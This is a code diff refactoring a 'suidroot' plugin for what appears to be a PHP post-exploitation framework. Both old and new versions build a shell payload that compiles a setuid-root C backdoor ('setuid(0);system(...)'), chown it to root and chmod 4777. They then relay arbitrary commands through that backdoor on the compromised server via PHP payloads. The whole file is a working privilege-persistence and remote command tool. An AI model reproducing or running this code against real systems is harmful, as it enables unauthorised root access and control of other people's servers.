@@ -50,116 +50,115 @@ ENVIRONMENT:
         The exploit file with setuid byte
     * SUIDROOT_PIPE
         The SUIDROOT_BACKDOOR's command repsonse recipient
-    * SUIDROOT_CWD
+    * SUIDROOT_PWD
         The current working directory as privileged user
 
 AUTHOR:
     nil0x42 <http://goo.gl/kb2wf>
 """
 
-# enable plugin use with the 'shell' command
-api.isshell()
+import sys
 
-# fail if the remote server is a Windows platform
-if api.server['platform'] == 'win':
-    api.exit(P_err+self.name+': Only available on unix systems')
+import ui.color
+import ui.input
 
-# at least 1 argument must be given
-if self.argc < 2:
-    api.exit(self.help)
+from api import plugin
+from api import server
+from api import environ
 
-# on suidroot handle generation
-if self.argv[1] == 'generate':
-    # at least 2 argument must be given in this case
-    if self.argc != 3:
-        api.exit(self.help)
+if environ["PLATFORM"].lower().startswith("win"):
+    sys.exit("Plugin available on unix-based platforms only")
 
-    # the 3rd argument determines the setuid file to use
-    suidFile = rpath.abspath(self.argv[2])
-    suidDir = rpath.dirname(suidFile)
+if len(plugin.argv) < 2:
+    sys.exit(plugin.help)
 
-    # generate the payload that must be run as privileged user, it will
-    # create the wanted file with suid byte, making tunnel available.
-    pipe = suidDir+'/.x.x.x'
-    backdoor = 'main(){setuid(0);system("%s");}' %pipe
+if plugin.argv[1] == 'generate':
+    # this command requires a third argument
+    if len(plugin.argv) != 3:
+        sys.exit(plugin.help)
+
+    # the third arg determines this setuid file to use
+    suid_file = server.path.abspath(plugin.argv[2])
+    suid_dir = server.path.dirname(suid_file)
+
+    # create the payload that must be run as privileged used.
+    # The suidroot backdoor is then created with suid byte
+    # enabled, making tunnel available.
+    pipe_file = suid_dir + "/.x.x.x"
+    backdoor = 'main(){setuid(0);system("%s");}' % pipe_file
     payload = ("chmod 777 %d;echo -e '%b'>%f;gcc -x c"
                " -o %f %f;chown root %f;chmod 4777 %f")
-    payload = payload.replace('%b',backdoor)
-    payload = payload.replace('%f',suidFile)
-    payload = payload.replace('%d',suidDir)
+    payload = payload.replace('%b', backdoor)
+    payload = payload.replace('%f', suid_file)
+    payload = payload.replace('%d', suid_dir)
 
     # once generated, ask the user to execute the payload as privileged user
-    print('To activate the suidroot backdoor, execute '
-          'this payload AS ROOT on the remote system:')
-    print(P_NL+color(34)+payload+color(0)+P_NL)
+    print("[*] To activate the suidroot backdoor, execute"
+          " this payload AS ROOT on the remote system:")
+    print(ui.color.colorize("\n", "%Blue", payload, "\n"))
 
-    # wait for positive responce before creating the env var
-    if not reply.isyes('Was the payload executed ?'):
-        api.exit(P_err+self.name+': Payload generation aborted')
+    # wait for positive response before creating the env var
+    msg = "Press enter as soon as the payload had been executed "
+    try:
+        ui.input.Expect(None, skip_interrupt=False)(msg)
+    except (KeyboardInterrupt, EOFError):
+        sys.exit("Payload generation aborted")
 
     # send the checker.php payload with BACKDOOR value
-    http.send( {'BACKDOOR': suidFile}, 'checker')
-    if http.error:
-        # exit if the suid file was not correctly set
-        api.exit( P_err+'%s: %s: Is not a valid suidroot backdoor' \
-                      %(self.name, suidFile) )
+    checker = server.payload.Payload("checker.php")
+    checker['BACKDOOR'] = suid_file
+    checker.send()
 
     # if the env do not exist, create it empty
-    if 'SUIDROOT_BACKDOOR' not in api.env:
-        api.env['SUIDROOT_BACKDOOR'] = ''
+    # import pprint
+    # pprint.pprint(environ)
+    if "SUIDROOT_BACKDOOR" not in list(environ.keys()):
+        environ['SUIDROOT_BACKDOOR'] = "_"
+    # pprint.pprint(environ)
 
     # build the env var value
-    if suidFile != api.env['SUIDROOT_BACKDOOR']:
+    if suid_file != environ['SUIDROOT_BACKDOOR']:
         try:
-            del api.env['SUIDROOT_BACKDOOR']
+            del environ['SUIDROOT_BACKDOOR']
         except:
             pass
-        api.env['SUIDROOT_BACKDOOR'] = suidFile
-        api.env['SUIDROOT_CWD']      = rpath.cwd
-        api.env['SUIDROOT_PIPE']     = pipe
+        environ['SUIDROOT_BACKDOOR'] = suid_file
+        environ['SUIDROOT_PWD'] = environ['PWD']
+        environ['SUIDROOT_PIPE'] = pipe_file
 
-    api.exit(P_inf+'The suidroot exploit is now available !')
+    print("[*] The suidroot exploit is now available !")
+    sys.exit()
 
 
 # On classic command pass, make sure the exploit is activated
-if not 'SUIDROOT_BACKDOOR' in api.env:
-    api.exit(P_err+"Suidroot exploit not activated,"
-             " use the 'generate' argument")
+if 'SUIDROOT_BACKDOOR' not in environ.keys():
+    sys.exit("Exploit still not deployed, use the 'generate' argument")
 
 # build the command to send from given arguments
-command = 'cd '+api.env['SUIDROOT_CWD']+'\n' # goto exploit current dir
-command += (' '.join(self.argv[1:]))+'\n' # the joined user arguments
-command += 'echo suid `pwd` suid\n' # parser to make sure new pwd is known
+command = 'cd ' + environ['SUIDROOT_PWD'] + '\n'  # goto exploit current dir
+command += (' '.join(plugin.argv[1:])) + '\n'  # the joined user arguments
+command += 'echo suid `pwd` suid\n'  # token to make sure new pwd is known
 
-# build the query dict and sent it through payload.php
-query = {'BACKDOOR' : api.env['SUIDROOT_BACKDOOR'],
-         'PIPE'     : api.env['SUIDROOT_PIPE'],
-         'COMMAND'  : command}
-http.send(query)
+# build the payload to send the command to run on system
+payload = server.payload.Payload("payload.php")
+payload['BACKDOOR'] = environ['SUIDROOT_BACKDOOR']
+payload['PIPE'] = environ['SUIDROOT_PIPE']
+payload['COMMAND'] = command
 
-# exit with errors if any
-if http.error:
-    api.exit(http.error)
+response = payload.send()
 
-# split response lines, and return empty if no data
-response = http.response.splitlines()
-if not response:
-    api.exit('')
+lines = response.splitlines()
+if not lines:
+    sys.exit("")
 
-newpwd = response[-1] # get new pwd if it has changed (last output line)
-response = P_NL.join(response[:-1]) # the rest is the given command's response
+new_pwd = lines[-1]
+response = "\n".join(lines[:-1])
 
-# check if new pwd command has been executed, then unparse
-# it and set it as new SUIDROOT_CWD environment value.
-err = P_err+self.name+': Fatal error'
-if not newpwd.startswith('suid '):
-    api.exit(err)
-if not newpwd.endswith('suid'):
-    api.exit(err)
-newpwd = newpwd[5:-5]
-if not rpath.isabs(newpwd):
-    api.exit(err)
-api.env['SUIDROOT_CWD'] = newpwd
+assert new_pwd.startswith("suid ")
+assert new_pwd.endswith(" suid")
+new_pwd = new_pwd[5:-5]
+assert server.path.isabs(new_pwd)
+environ['SUIDROOT_PWD'] = new_pwd
 
 # finaly, print the command response
 print(response)
